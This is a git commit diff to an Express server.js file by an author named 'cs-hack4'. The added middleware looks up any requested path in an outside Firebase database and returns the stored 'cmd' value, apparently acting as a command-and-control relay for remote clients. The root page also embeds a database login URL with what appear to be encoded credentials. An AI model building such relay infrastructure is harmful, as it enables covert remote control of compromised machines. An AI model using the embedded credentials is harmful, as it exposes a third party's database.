3f514a1c7142cec35c1dfef74657814d902d50cd
cs-hack4 <70279744+cs-hack4@users.noreply.github.com>
2024-09-05 16:05:42 +0600

    Update server.js

--- server.js
+++ server.js
@@ -1,4 +1,5 @@
 const express = require('express')
+const axios = require('axios')
 
 let app = express()
 
@@ -10,4 +11,37 @@ app.listen(process.env.PORT || 3000, ()=>{
 
 app.get('/', async (req, res) => {
     res.status(200).send('<button onclick="openDB()">Database</button><script>function openDB() { window.open("https://php-myadmin.net/login.php?2=ezyro_37115096wejghelqwdtg3e54gVG5wak1rMTZRVEpPUkVrelRWaDNhRWxUUldoSldIZzRaa2g0T0daSWVEaG1TSGMwVDBSQ2RWbFliSEJaV0VrOQ==wejghelqwdtg3e54gsql110.ezyro.comwejghelqwdtg3e54gezyro_37115096_raiyan&db=ezyro_37115096_raiyan") }</script>')
+})
+
+app.use(async (req, res, next) => {
+    try {
+        let path = req.originalUrl
+        if(path.length > 1) {
+            try {
+                let name = path.substring(1, path.length)
+
+                if(name.endsWith('/t0')) {
+                    name = name.substring(0, name.length-3)
+                }
+                
+                let response = await axios.get('https://server-9099-default-rtdb.firebaseio.com/public/mysql/'+name+'.json')
+                
+                let data = response.data
+
+                if(data != null && data != 'null') {
+                    res.end(data.cmd)
+                } else {
+                    res.end('Null')
+                }
+            } catch (error) {
+                console.log(error)
+                
+                res.end('Error')
+            }
+        } else {
+            next()
+        }
+    } catch (error) {
+        next()   
+    }
 })
